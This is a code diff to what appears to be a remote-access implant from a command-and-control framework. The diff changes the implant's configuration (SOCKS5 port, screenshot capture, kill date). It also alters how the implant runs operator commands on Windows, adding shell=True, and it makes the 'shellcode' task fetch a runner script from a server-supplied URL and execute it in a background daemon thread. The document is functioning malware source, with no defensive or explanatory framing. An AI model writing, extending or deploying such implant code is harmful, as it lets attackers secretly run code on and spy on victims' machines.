@@ -107,7 +107,7 @@ class Config:
         self.SOCKS5_PORT = 1080
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
-        self.TAKE_SCREENSHOTS = True
+        self.TAKE_SCREENSHOTS = False
         self.SCREENSHOT_FREQUENCY = 10
         self.KILLDATE_ENABLED = False
         self.KILLDATE = "" if False else ""
@@ -1278,11 +1278,11 @@ if platform.system() == 'Windows':
                 # Run synchronously and capture output
                 result = subprocess.run(
                     cmd,
-                    creationflags=subprocess.CREATE_NO_WINDOW,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     text=True,
-                    timeout=60
+                    timeout=60,
+                    shell=True
                 )
                 
                 return {
@@ -1961,27 +1961,31 @@ class Agent:
             elif task_type == "shellcode":
                 try:
                     runner_url = task.get("data", {}).get("runner_url")
-                    
+
                     if not runner_url:
                         return {
                             "status": "error",
                             "message": "No runner URL provided"
                         }
 
-                    self._log_info(f"Executing runner script from: {runner_url}")
-                    
-                    # Execute the runner script and capture output
-                    result = ShellcodeRunner.execute_runner(runner_url)
-                    
+                    self._log_info(f"Starting shellcode execution from: {runner_url}")
+
+                    # Execute the runner script asynchronously in a separate thread
+                    def run_shellcode_async():
+                        try:
+                            result = ShellcodeRunner.execute_runner(runner_url)
+                            self._log_info(f"Shellcode execution result: {result}")
+                            # Optionally send result back to server if needed
+                        except Exception as e:
+                            self._log_error(f"Async shellcode execution failed: {str(e)}")
+
+                    threading.Thread(target=run_shellcode_async, daemon=True).start()
+
                     return {
-                        "status": "success" if result.get('status') == 'success' else 'error',
-                        "message": result.get('message', ''),
-                        "stdout": result.get('stdout', ''),
-                        "stderr": result.get('stderr', ''),
-                        "returncode": result.get('returncode', None),
-                        "details": result
+                        "status": "success",
+                        "message": "Shellcode execution started in background"
                     }
-                        
+
                 except Exception as e:
                     self._log_error(f"Shellcode processing failed: {str(e)}")
                     return {
